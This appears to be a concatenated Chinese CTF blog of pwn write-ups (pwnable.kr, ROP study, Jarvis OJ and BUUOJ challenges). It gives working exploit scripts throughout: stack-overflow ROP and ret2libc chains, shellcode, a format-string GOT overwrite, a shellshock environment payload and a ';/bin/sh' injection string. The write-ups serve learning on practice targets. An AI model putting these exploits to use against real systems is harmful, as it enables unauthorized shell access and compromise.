第二关第一个read从键盘获取标准输入，第二个read获取一个标准错误输出，主要难点是要如何构造这个标准错误输出，这里就要利用linux的I/O重定向，先要fork一个子进程，然后通过pipe构造 stage2 int stdin_pip[2] = {-1, -1}; int stderr_pip[2] = {-1, -1}; pid_t childpid; if(pipe(stdin_pip) &lt; 0 || pipe(stderr_pip) &lt; 0) { perror(&quot;FATAL: cannot create pipe&quot;); exit(-1); } #define STDIN_READ stdin_pip[0] //parent #define STDIN_WRITE stdin_pip[1] //child #define STDERR_READ stderr_pip[0] //parent #define STDERR_WRITE stderr_pip[1] //child if((childpid = fork()) &lt; 0) { perror(&quot;FATAL: cannot fork child&quot;); exit(-1); }else if(childpid == 0) /* in the child */ { /*The child process first waits for the parent process to redict pipe_read. Then close them. */ sleep(1); close(STDIN_READ); close(STDERR_READ); /* Writing the corresponding string to the two pipes,the parent process has redicted the pipe_read to the stdin &amp; stderr. */ write(STDIN_WRITE, &quot;\\x00\\x0a\\x00\\xff&quot;, 4); write(STDERR_WRITE, &quot;\\x00\\x0a\\x02\\xff&quot;, 4); }else { //close the child process close(STDERR_WRITE); close(STDIN_WRITE); dup2(STDIN_READ, 0); //stdin redicts to STDIN_pipe dup2(STDERR_READ, 2); //stderr redicts to STDERR_pipe execve(&quot;/home/input2/input&quot;,argv,envp); } 参考 Stage 3第三题就改下环境变量envp那个参数，通常是以Env=vaule的形式存在数组里 stage3 char* envp[2] = {&quot;\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe&quot;, NULL}; Stage 4第四关就要在一个文件里写入\\x00\\x00\\x00\\x00，照着写就行 stage 4 FILE* fp = fopen(&quot;\\x0a&quot;, &quot;wb&quot;); if(!fp) { perror(&quot;Failed&quot;); exit(-1); }else { puts(&quot;Successs&quot;); } fwrite(&quot;\\x00\\x00\\x00\\x00&quot;, 4, 1, fp); fclose(fp); Stage 5这一关考察socket编程，要求写一个socket通信，并在agrv['C']处传入对应的字符串 一些基础知识 socket编程 参考网上的一些wp，跟着写出来 stage5 要注意在stage 1处添加一行argv['C'] = &quot;3737&quot; sleep(2); int sd; struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); saddr.sin_port = htons(3737); char buf[5]; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1) { perror(&quot;Socket error&quot;); exit(-1); } if(connect(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0) { perror(&quot;Can't connect to server&quot;); exit(-1); } strcpy(buf, &quot;\\xde\\xad\\xbe\\xef&quot;); send(sd, buf, 4, 0); close(sd); 因为远程环境的用户权限问题，只能在/tmp目录下新建一个文件夹再写入exp脚本，再用ln -s /home/input2/flag flag生成一个软链接，最后编译运行exp脚本即可 完整exp #include &quot;stdio.h&quot;#include &quot;unistd.h&quot;#include &quot;stdlib.h&quot;#include &quot;sys/socket.h&quot;#include &quot;arpa/inet.h&quot;#include &quot;string.h&quot;int main(){ char* argv[101] = {0}; argv[0] = &quot;/home/input2/input&quot;; char* envp[2] = {&quot;\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe&quot;, NULL}; for(int i = 0; i &lt; 100; ++i) { argv[i] = &quot;A&quot;; } argv['A'] = &quot;\\x00&quot;; argv['B'] = &quot;\\x20\\x0a\\x0d&quot;; argv['C'] = &quot;3737&quot;;/*&lt;--------------------------------------------------&gt;*/ int stdin_pip[2] = {-1, -1}; int stderr_pip[2] = {-1, -1}; pid_t childpid; if(pipe(stdin_pip) &lt; 0 || pipe(stderr_pip) &lt; 0) { perror(&quot;FATAL: cannot create pipe&quot;); exit(-1); } #define STDIN_READ stdin_pip[0] //parent #define STDIN_WRITE stdin_pip[1] //child #define STDERR_READ stderr_pip[0] //parent #define STDERR_WRITE stderr_pip[1] //child if((childpid = fork()) &lt; 0) { perror(&quot;FATAL: cannot fork child&quot;); exit(-1); }else if(childpid == 0) /* in the child */ { /*The child process first waits for the parent process to redict pipe_read. Then close them. */ sleep(1); close(STDIN_READ); close(STDERR_READ); /* Writing the corresponding string to the two pipes,the parent process has redicted the pipe_read to the stdin &amp; stderr. */ write(STDIN_WRITE, &quot;\\x00\\x0a\\x00\\xff&quot;, 4); write(STDERR_WRITE, &quot;\\x00\\x0a\\x02\\xff&quot;, 4); }else { //close the child process close(STDERR_WRITE); close(STDIN_WRITE); dup2(STDIN_READ, 0); //stdin redicts to STDIN_pipe dup2(STDERR_READ, 2); //stderr redicts to STDERR_pipe execve(&quot;/home/input2/input&quot;,argv,envp); }/*&lt;----------------------------------------------------------------&gt;*/ FILE* fp = fopen(&quot;\\x0a&quot;, &quot;wb&quot;); if(!fp) { perror(&quot;Failed&quot;); exit(-1); }else { puts(&quot;Successs&quot;); } fwrite(&quot;\\x00\\x00\\x00\\x00&quot;, 4, 1, fp); fclose(fp);/*&lt;------------------------------------------------------------------&gt;*/ sleep(2); int sd; struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); saddr.sin_port = htons(3737); char buf[5]; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1) { perror(&quot;Socket error&quot;); exit(-1); } if(connect(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0) { perror(&quot;Can't connect to server&quot;); exit(-1); } strcpy(buf, &quot;\\xde\\xad\\xbe\\xef&quot;); send(sd, buf, 4, 0); close(sd); return 0;} 做完这题也是学到了很多以前不了解或者不熟悉的linux和C语言的相关知识，还是很值的。另外此题应该也可以用python写脚本打远程，先留个坑，有时间补…👴累了 0x08 leg考察arm汇编的基础知识，以前没了解过，搜索了解下基本的 andyhzw&amp;&amp;azeria-labs arm和x86对照表 题目三个函数都是用arm内联汇编写的，在主函数中通过key1()+key2+key3==key就能拿到flag，题目也给了反汇编代码 gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. arm架构下有ASM mode和Thumb mode两种模式,在ASM mode下指令长度为2个字节，在Thumb mode下指令长度为4个字节，pc(r15)总是指向当前指令地址下两条指令的地址 所以程序执行0x00008cdc后，r3=0x00008cdc + 8，然后将r3传给r0作为函数返回值，即key1=0x00008cdc + 8 gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push {r3} 0x00008d0a &lt;+26&gt;: pop {pc} 0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. 首先存储r6的值 执行key2+12，r6=0x00008d05 指令地址会先和0xFFFFFFFE进行按位与，因为最后一位肯定是0，因此最后一位用于做标志位，bx执行时如果地址最后一位是0，表示跳到asm mode，1则跳到thumb mode,当前地址最低位是1，所以是thumb mode key+20处，r3=0x00008d08 往下，r3=0x00008d0c 最后依然r3传给r0，用r0做返回值。 key2 = 0x00008d0c (gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) r3 = lr r0 = r3 lr是key3函数的返回地址，在main函数的反汇编里找 lr就是0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;处pc-4的地址，也就是下一条指令地址 key3 = 0x00008d80 exp 0x09 mistake题目描述给了hint，是因为运算优先级造成的错误，主要看 int fd;if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){ printf(&quot;can't open password %d\\n&quot;, fd); return 0;} 仔细看，他if语句这里是没有另外加括号的，因为比较运算符的优先级高于赋值运算符，所以fd的值永远会是0 而fd是0的话，后面read的fd参数就永远是0，而不是文件描述符，read也就是从stdin里读，而不是从/home/mistake/password&quot;读 open函数返回值 成功：新打开的文件描述符 失败：-1 open返回的文件描述符一定是最小的而且没有被使用的 所以两个参数的buf我们都可控，buf2我们根据异或的规律构造一下就好了 exp #coding=utf-8from pwn import *shell=ssh(host='pwnable.kr',user='mistake',password='guest',port=2222)io=shell.run('./mistake')buf1 = 'Carylnk\\x00'buf2 = &quot;&quot;for i in buf1: buf2 += chr(ord(i) ^ 1)io.sendafter('do not bruteforce...\\n', buf1)io.sendafter('input password : ', buf2)io.interactive() 0xA shellshock#include &lt;stdio.h&gt;int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(&quot;/home/shellshock/bash -c 'echo shock_me'&quot;); return 0;} 题目源码是关于uid和gid的问题，👴Linux没学好也不懂 上网搜了下发现是一个已经开源的漏洞CVE-2014-6271 测试发现漏洞是存在，但是貌似权限不够读不了 而我们运行shellshock程序权限就会上升到egid——shellshock_pwn exp env x='() { :;}; bash -c &quot;cat flag&quot; ' ./shellshock 0xB coin1TODO…","link":"/2022/02/03/pwnkr/"},{"title":"ROP Study","text":"参考蒸米一步一步学ROP linux下_x86篇level1第一题主要的点就是在找shellcode的地址，要开启core dump这个功能 ulimit -c unlimited 接着用gdb调试core这个文件 pwndbg&gt; x/10s $esp-1440xffffd480: &quot;1\\311\\367\\341Qh//shh/bin\\211\\343\\260\\v̀&quot;, 'a' &lt;repeats 119 times&gt;, &quot;\\220\\324\\377\\377\\n\\325\\377\\377&quot;0xffffd515: &quot;&quot;0xffffd516: &quot;&quot;0xffffd517: &quot;&quot;0xffffd518: &quot;&quot;0xffffd519: &quot;&quot;0xffffd51a: &quot;&quot;0xffffd51b: &quot;&quot;0xffffd51c: &quot;!\\337\\337&quot;, &lt;incomplete sequence \\367&gt;0xffffd521: &quot;\\320\\373&quot;, &lt;incomplete sequence \\367&gt; 这里我遇到一个问题就是，每次出来的地址不同，有的可利用，有的不可以 exp如下 from pwn import *io = process('./level1')buf_addr = 0xffffd480shellcode = (asm(shellcraft.sh()))payload = shellcode + (140 - len(shellcode)) * b'a'+ p32(buf_addr)io.sendline(payload)io.interactive() level2level2我们打开DEP 这个就是典型的ret2lib，在gdb中先使程序在main下个断点，然后run起来，使程序加载libc.so,就可以使用print system以及search找到system函数在内存中的地址和/bin/sh的地址 exp from pwn import *io = process('./level2')system_addr = 0xf7e222e0bin_sh = 0xf7f630afpayload = b'a' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh)io.sendline(payload)io.interactive() level3这题我们再打开ASLR sudo -s echo 2 &gt; /proc/sys/kernel/randomize_va_space 用ldd命令查看发现libc.so的地址每次都会改变 为了bypass ASLR,我们的思路是：先泄漏出程序内某些函数的地址，然后通过其偏移来算出基地址，再算出我们要利用函数的地址 因为程序中并没有使用system函数，但是我们可以利用write@plt()函数将write函数的地址通过write@got泄漏出来，原因是write函数是在libc.so中实现的，当我们调用write@plt时，系统将write的地址linking到write@got中，通过linux中的LazyBinding，它会跳转到write@got上从而找到write函数的地址 计算函数偏移可以看这张图 exp如下 from pwn import *#io = process('./level2')io = remote('127.0.0.1',10003)elf = ELF('./level2')lib = ELF('libc.so')write_plt = elf.symbols['write']write_got = elf.symbols['write']start = elf.symbols['_start']vul_addr = elf.symbols['vulnerable_function']padding = b'a' * 140payload1 = padding + p32(write_plt)+p32(start)+ p32(1)+ p32(write_got) +p32(4)io.send(payload1)write_addr = u32(io.recv(4))print(hex(write_addr))lib_base = write_addr - lib.symbols['write']system = lib_base + lib.symbols['system']bin_sh = lib_base + next(lib.search(b'/bin/sh'))payload2 = padding + p32(system) + p32(0xdeadbeef) + p32(bin_sh)io.sendline(payload2)io.interactive() level4无libc.so的ret2libc，利用DynELF泄漏出system地址 from pwn import *io = process('./level2')elf = ELF('./level2')write_plt = elf.symbols['write']start = elf.symbols['_start']bss = elf.bss()vul_addr = elf.symbols['vulnerable_function']read_plt = elf.symbols['read']def leak(address): payload = b'a' * 140 + p32(write_plt) + p32(start) + p32(1) + p32(address) + p32(4) io.sendline(payload) data = io.recv(4) return datad = DynELF(leak, elf=ELF('./level2'))system_addr = d.lookup('system', 'libc')payload2 = b'a' * 140 + p32(read_plt) + p32(vul_addr) + p32(0) + p32(bss) + p32(8)io.sendline(payload2)io.send('/bin/sh\\x00')payload3 = b'a' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(bss)io.interactive() linux下_x64篇 内存地址由32位变为64位 参数传递，前六个参数从左到右依次存在RDI,RSI,RDX,RCX,R8,R9。多于六个的参数从右到左存在栈上，同x86传参 Level2_x64这里因为我本地环境可能有点问题，编译出来的程序，exp打的时候总会报错。。。于是就用javirs oj上的题来练手了 这题和之前的x86差不多，就是要改传参的方式 exp from pwn import *io = remote('pwn2.jarvisoj.com', 9882)elf = ELF('./level2_x64')system = elf.symbols['system']bin_sh = next(elf.search(b'/bin/sh'))pop_rdi_ret = 0x00000000004006b3payload = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(0xdeadbeef)io.recvuntil('Input:\\n')io.sendline(payload)io.interactive() Level3_x64这题思路也是与x86的相同，只是传参调用的方式变了，要设置寄存器以及从左到右传参 exp如下 from pwn import *io = remote('pwn2.jarvisoj.com',9883)elf = ELF('./level3_x64')lib = ELF('./libc-2.19.so')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']pop_rdi_ret = 0x00000000004006b3pop_rdi_r15_ret = 0x00000000004006b1vul_addr = elf.symbols['vulnerable_function']payload = b'a' * 0x88payload += p64(pop_rdi_ret) + p64(1)payload += p64(pop_rdi_r15_ret) + p64(write_got) + p64(0xdeadbeef)payload += p64(write_plt) + p64(start)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)write_addr = u64(io.recv(8))lib_base = write_addr - lib.symbols['write']system = lib_base + lib.symbols['system']bin_sh = lib_base + next(lib.search(b'/bin/sh'))payload2 = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload2)io.interactive() HITCON Trainging - lab5&amp;&amp;lab6 在static linking情况下有很多gadget可以利用 bypass DEP/NX 源程序 #include &lt;stdio.h&gt;int main(){ char buf[20]; puts(&quot;ROP is easy is'nt it ?&quot;); printf(&quot;Your input :&quot;); fflush(stdout); read(0,buf,100); } 查看保护 Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) Static LinkingFile simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped exp from pwn import *io = process('./simplerop')context.arch = 'i386'padding = b'a' * 32buf_data = 0x080ea060 # size use 68pop_eax_ret = 0x080bae06pop_edx_ecx_ebx_ret = 0x0806e850mov_dedx_eax_ret = 0x0809a15dpop_edx_ret = 0x0806e82apop_edx_ecx_ebx_ret = 0x0806e850int_80 = 0x080493e1rop = flat([pop_edx_ret,buf_data,pop_eax_ret,'/bin',mov_dedx_eax_ret])rop += flat([pop_edx_ret,buf_data+4,pop_eax_ret,'/sh\\x00',mov_dedx_eax_ret])rop += flat([pop_edx_ecx_ebx_ret,0,0,buf_data,pop_eax_ret,0xb,int_80])payload = padding + ropio.recvuntil(&quot;:&quot;)io.sendline(payload)io.interactive() Using ROP bypass ASLR 假设dynamic编译的程序中存在BOF漏洞且没开PIE情况(先不考虑Stack Guard) How to bypass Use .plt section to leak information 存在put write send…等 output function Stack Migration#include &lt;stdio.h&gt;int count = 1337 ;int main(){ if(count != 1337) _exit(1); count++; char buf[40]; setvbuf(stdout,0,2,0); puts(&quot;Try your best :&quot;); read(0,buf,64); return ; } gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration exp from pwn import *import timeio = process('./migration')elf = ELF('./migration')libc = ELF('/lib/i386-linux-gnu/libc.so.6')padding = b'a' * 40 #44 预留4个byte控制ebpbuf1 = 0x804ae00buf2 = buf1 + 0x100read_plt = elf.plt['read']put_plt = elf.plt['puts']leave_ret = 0x08048418pop_ebx_ret = 0x0804836dput_got = elf.got['puts']put_off = libc.symbols['puts']rop1 = flat([buf1,read_plt,leave_ret,0,buf1,100])payload = padding + rop1io.send(payload)time.sleep(0.1)rop2 = flat([buf2,put_plt,pop_ebx_ret,put_got,read_plt,leave_ret,0,buf2,100])io.send(rop2)time.sleep(0.1)io.recvuntil(&quot;\\n&quot;)data = u32(io.recvuntil(&quot;\\n&quot;)[:-1])lib = data - put_offprint(hex(lib))system = lib + libc.symbols['system']bin_sh = buf2 + 16 #bin_sh在rop3的第四个，一个占4byterop3 = flat([buf1,system,0xdeadbeef,bin_sh,'/bin/sh\\x00'])io.send(rop3)time.sleep(0.1)io.interactive() Stack Pivoting概念转自CTF-WIKI 劫持栈指针指向攻击者所能控制的内存处 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用 X-CTF Quals 2016 - b0verfl0w先放exp from pwn import *io = process('./b0verfl0w')jmp_esp = 0x08048504shellcode = b&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot;padding = (0x20 - len(shellcode)) * b'a'#payload#shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp espsub_esp_jmp = asm('sub esp, 0x28;jmp esp')payload = flat([shellcode, padding, b'b' * 4, jmp_esp, sub_esp_jmp])io.recvuntil(&quot;What's your name?\\n&quot;)io.sendline(payload)io.interactive() 在IDA中可以发现我们可以利用的溢出长度很短，所以我们很难找到一些ROPchain，根据wiki上的思路就是 在栈上布置shellcode 操控eip指向shellcode处 再就是payload最后一段的设置esp len(shellcode+padding) = 0x20 len(ebp) = 4 len(jmp_esp) = 4 所以就是sub esp,0x28jmp esp 找shellcode的网站找尽量短的 http://shell-storm.org/shellcode/files/shellcode-575.php TO DO…","link":"/2021/12/06/rop/"},{"title":"PWN刷题记录","text":"平时做题的一点记录，各个平台的都有，难度也是随机的，有些会详细写，有些会略过，慢慢更新(👴是懒狗 [TOC] level0简单栈溢出 from pwn import *#io = process('./level0')io = remote('node4.buuoj.cn',25474)payload = b'a'*0x88system = 0x0000000000400596payload += p64(system)io.recvuntil(&quot;Hello, World\\n&quot;)io.sendline(payload)io.interactive() level1根据泄漏的buf地址ret2shellcode from pwn import *io = remote('node4.buuoj.cn',27234)#io = process('./level1')io.recvuntil(&quot;What's this:&quot;)buf_addr = int(io.recv(10),16)sc = (asm(shellcraft.sh()))payload = sc + (0x88-len(sc))*b'a' + b'bbbb' +p32(buf_addr)io.sendline(payload)io.interactive() level2开了NX保护，无法再写入shellcode，IDA可以看到调用system函数，我们可以进行ret2lib from pwn import *io = remote('node4.buuoj.cn',28221)elf = ELF('./level2')system = elf.symbols['system']sh = 0x804a029 #gdb search shpayload = b'a'*0x8C + p32(system) + p32(0xdeadbeef) + p32(sh)io.sendline(payload)io.interactive() level3ret2lib的题型 首先vulnerable_function中read函数存在溢出，接着控制程序流程，构造函数调用栈 然后利用write泄漏出其地址，根据偏移算出lib_base 然后配合题目提供的 libc 文件计算 system() 函数的地址以及 /bin/sh 的地址 再利用read的栈溢出get shell from elftools.construct.macros import UBInt32from pwn import *from six import uio = remote('pwn2.jarvisoj.com',9879)libc = ELF('./libc-2.19.so')elf = ELF('./level3')#泄漏write函数地址write_plt = elf.plt['write']write_got = elf.got['write']vul_addr = elf.symbols['vulnerable_function']payload0 = b'a' * (0x8C) + p32(write_plt) + p32(vul_addr) + p32(0x1) + p32(write_got) + p32(0x4)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload0)write_addr = u32(io.recv(4))lib_base = write_addr - libc.symbols['write']system_addr = lib_base + libc.symbols['system']print(hex(system_addr))bin_sh = lib_base + next(libc.search(b'/bin/sh'))payload = b'a' * 0x8C + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)io.interactive() 这题若没给libc文件，我们也可以用DynELF来做 from pwn import *io = remote('pwn2.jarvisoj.com',9879)elf = ELF('./level4')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']#循环泄漏地址时，最好返回跳转到start位置vul_addr = elf.symbols['vulnerable_function']read_plt = elf.symbols['read']bss_addr = elf.bss()def leak(address): payload0 = b'a' * (0x8C) + p32(write_plt) + p32(start) + p32(1) + p32(address) + p32(4) io.recvuntil(&quot;Input:\\n&quot;) io.sendline(payload0) data = io.recv(4) return datad = DynELF(leak, elf=ELF('./level3'))system_addr = d.lookup('system','libc')payload1 = b'a' * 0x8C + p32(read_plt) + p32(vul_addr) + p32(0x0) + p32(bss_addr) + p32(0x8)io.sendline(payload1)io.send('/bin/sh\\x00')payload2 = b'a' * 0x8C + p32(system_addr) + p32(0) + p32(bss_addr)io.sendline(payload2)io.interactive() 若python3环境报错的话，改dynelf.py文件的582行为这个 result = e.symbols[symb.decode()] level4其实level4就是没给lib的level3那个跳转函数的位置最好写start，程序开始的位置，网上很多wp用的是vul那个函数，但是我这里一直打不通，用start就可以。 from pwn import *io = remote('pwn2.jarvisoj.com',9880)elf = ELF('./level4')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']#循环泄漏地址时，最好返回跳转到start位置vul_addr = elf.symbols['vulnerable_function']read_plt = elf.symbols['read']bss_addr = elf.bss()def leak(address): payload0 = b'a' * (0x8C) + p32(write_plt) + p32(start) + p32(1) + p32(address) + p32(4) #io.recvuntil(&quot;Input:\\n&quot;) io.sendline(payload0) data = io.recv(4) return datad = DynELF(leak, elf=ELF('./level4'))system_addr = d.lookup('system','libc')payload1 = b'a' * 0x8C + p32(read_plt) + p32(vul_addr) + p32(0x0) + p32(bss_addr) + p32(0x8)io.sendline(payload1)io.send('/bin/sh\\x00')payload2 = b'a' * 0x8C + p32(system_addr) + p32(0) + p32(bss_addr)io.sendline(payload2)io.interactive() 注意把recv(“input”)去掉就好了 jarvisoj_tell_me_something在read函数处有明显的栈溢出，用gdb可以算出偏移是136，然后ida发现有个good_game函数，F5后发现里面会读出flag.txt，但是main函数中没有调用，所以我们利用栈溢出覆盖到good_game的地址 exp from pwn import *context.log_level = 'debug'name = './guest'#io = process(name)io = remote('node4.buuoj.cn',27744)elf = ELF('./guest')padding = b'a' * 0x88good_game = elf.symbols['good_game']payload = padding + p64(good_game)io.recvuntil(&quot;Input your message:\\n&quot;)io.sendline(payload)io.interactive() Level2_x64这题和之前的x86差不多，就是要改传参的方式 exp from pwn import *io = remote('pwn2.jarvisoj.com', 9882)elf = ELF('./level2_x64')system = elf.symbols['system']bin_sh = next(elf.search(b'/bin/sh'))pop_rdi_ret = 0x00000000004006b3payload = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(0xdeadbeef)io.recvuntil('Input:\\n')io.sendline(payload)io.interactive() Level3_x64这题思路也是与x86的相同，只是传参调用的方式变了，要设置寄存器以及从左到右传参 exp如下 from pwn import *io = remote('pwn2.jarvisoj.com',9883)elf = ELF('./level3_x64')lib = ELF('./libc-2.19.so')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']pop_rdi_ret = 0x00000000004006b3pop_rdi_r15_ret = 0x00000000004006b1vul_addr = elf.symbols['vulnerable_function']payload = b'a' * 0x88payload += p64(pop_rdi_ret) + p64(1)payload += p64(pop_rdi_r15_ret) + p64(write_got) + p64(0xdeadbeef)payload += p64(write_plt) + p64(start)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)write_addr = u64(io.recv(8))lib_base = write_addr - lib.symbols['write']system = lib_base + lib.symbols['system']bin_sh = lib_base + next(lib.search(b'/bin/sh'))payload2 = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload2)io.interactive() xdctf2015_pwn200ret2libc题型，无libc.so,利用DynELF exp from pwn import *#context.log_level = 'debug'name = './bof'#p = process(name)p = remote('node4.buuoj.cn',25758)elf = ELF(name)write_plt = elf.plt['write']start = elf.symbols['_start']read_plt = elf.plt['read']vul_addr = elf.symbols['vuln']bss = elf.bss()padding = b'a' * 112def leak(address): payload = flat([padding,write_plt,start,1,address,4]) p.recvuntil(&quot;~!\\n&quot;) p.send(payload) data = p.recv(4) return datad = DynELF(leak, elf=ELF('./bof'))system = d.lookup('system', 'libc')payload1 = flat([padding, read_plt, vul_addr, 0, bss, 8])p.sendline(payload1)p.send('/bin/sh\\x00')payload2 = flat([padding, system, 0xdeadbeef, bss])p.sendline(payload2)p.interactive() [BJDCTF 2020]babystack如题baby，基础的ret2text from pwn import *elf = ELF('ret2text')p=remote('1.14.71.254',28098)backdoor = elf.symbols['backdoor']p.sendline('100')payload = b'a' * 24 + p64(backdoor)p.sendline(payload)p.interactive() [BJDCTF 2020]babyrop这题思路没什么好说的，就是64位的无libc.so的ret2libc，利用LibcSearch做好传参顺序，我说说我遇到的几个点（大佬勿喷 最主要的是，我开始是用flat([ ])构造payload，一直没打通，折磨我好久。。。 还有就是LibcSearch会要你自己去选择几个libc.so，这个多打几次就好了 from pwn import *from LibcSearcher import *io = remote('1.14.71.254',28054)context.log_level = 'debug'#io = process('./pwn')elf = ELF('./pwn')put_plt = elf.plt['puts']puts_got = elf.got['puts']start = elf.symbols['_start']padding = b'a' * 0x28pop_rdi_ret = 0x0400733payload1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(put_plt) + p64(start)io.sendafter('story!',payload1)io.recv() #这里要接受一个数据，不然会错puts_addr = u64(io.recv(6).ljust(8,b'\\x00')) #[DEBUG] Received 0x6 bytes:print(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)lib_base = puts_addr - libc.dump('puts')print(hex(lib_base))system_addr = lib_base + libc.dump('system')print(hex(system_addr))bin_sh = lib_base + libc.dump('str_bin_sh')print(hex(bin_sh))payload2 = padding + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)io.sendafter(&quot;story!&quot;,payload2)io.interactive() [BJDCTF 2020]babystack2.0题目比1.0多了一个判断，比较nbytes和10的大小，在比较时是signed int,但是在read输入时是unsigned int 利用符号溢出，输入负数-1绕过判断，进入name进行栈溢出 from pwn import *io = remote('1.14.71.254',28031)backdoor = 0x0400726payload = b'a' * 0x18 + p64(backdoor)io.sendlineafter('name:','-1')io.sendlineafter('name?',payload)io.interactive() [BJDCTF 2020]babyrouter命令执行绕过 case 1 : puts(&quot;Please input the ip address:&quot;); read(0,ip,16); strcat(command,ip); system(command); puts(&quot;done!&quot;); break; 构造 ;/bin/sh [Jarvis OJ]fm格式化字符串漏洞，刚学到这一块，看得有点迷糊，做做题理解下 这题逻辑挺简单，x初始化为3，当修改x=4时就可以读出flag，所以我们就要利用format string将x对应内存地址处的值改为4 然后偏移的话，利用pwngdb的插件fmtarg算出是11 printf(x_address+&quot;%c$n&quot;)可以修改[x_address]的值为x_address的字符长度这里很巧的一点就是p32(x_addr)的长度刚好是4个字节 exp from pwn import *io = remote('pwn2.jarvisoj.com' ,9895)x_addr = 0x0804A02Cpayload = p32(x_addr) + b&quot;%11$n&quot;io.sendline(payload)io.interactive() inndy_echo同样是format string 导入IDA中可以看到 do { fgets(&amp;s, 256, stdin); printf(&amp;s); } while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); 在printf处可以利用，先在gdb中算出偏移是7，然后我们看到有system函数，我们就可以利用GOT hiJack将printf@got的内容改写成system@plt的地址,再写入/bin/sh\\x00执行 from pwn import *elf = ELF('echo')#io = process('./echo')io = remote('node4.buuoj.cn',26569)#context.terminal = ['tmux','splitw','-h']printf_got = elf.got['printf']system_plt = elf.plt['system']payload = fmtstr_payload(7,{printf_got:system_plt})io.sendline(payload)io.send('/bin/sh\\x00')io.interactive() [NSS新生赛]whitegive_pwn64位的无libc的rop，泄漏出puts 的地址，利用LibSearch算出基地址，得到system和bin/sh的地址，传参执行就好了 exp from pwn import *from LibcSearcher import *io = remote('1.14.71.254',28035)elf = ELF('./bgei')pop_rdi_ret = 0x0000000000400763puts_plt = elf.plt['puts']puts_got = elf.got['puts']main = elf.symbols['main']payload1 = b'a' * 24 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + 